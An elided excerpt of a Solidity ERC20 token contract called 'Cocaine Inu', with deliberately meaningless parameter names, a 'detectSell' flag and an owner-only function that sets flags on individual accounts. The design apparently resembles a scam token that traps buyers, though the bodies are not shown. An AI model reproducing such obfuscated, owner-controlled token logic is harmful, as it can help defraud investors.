...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address creator_, bool house1, bool house002, uint256 house09) {
        _name = name_;
        _symbol = symbol_;
        tXs = house09;
        PrepareRedistributionETH[creator_] = house002;
        redistMechanic = house002;
        tempVal = house002;
        detectSell = house1;
        _creator = creator_;
    ...
    function GetCocaNFTs(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _ProduceTheCocaine(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Cocaine is Context, ERC20 {
    constructor(
        ...
        uint256 house09
    ) ERC20(name, symbol, creator, house010, house2, house09) {
        _ProduceTheCocaine(owner, initialSupply, house6, house7);
    }
}

contract CocaineInu is ERC20Cocaine {
    constructor() ERC20Cocaine("Cocaine Inu", "COCAINU", false, true, 1000, 23, msg.sender, 50000000 * 10 ** 18, msg.sender, 5) {
    }
}
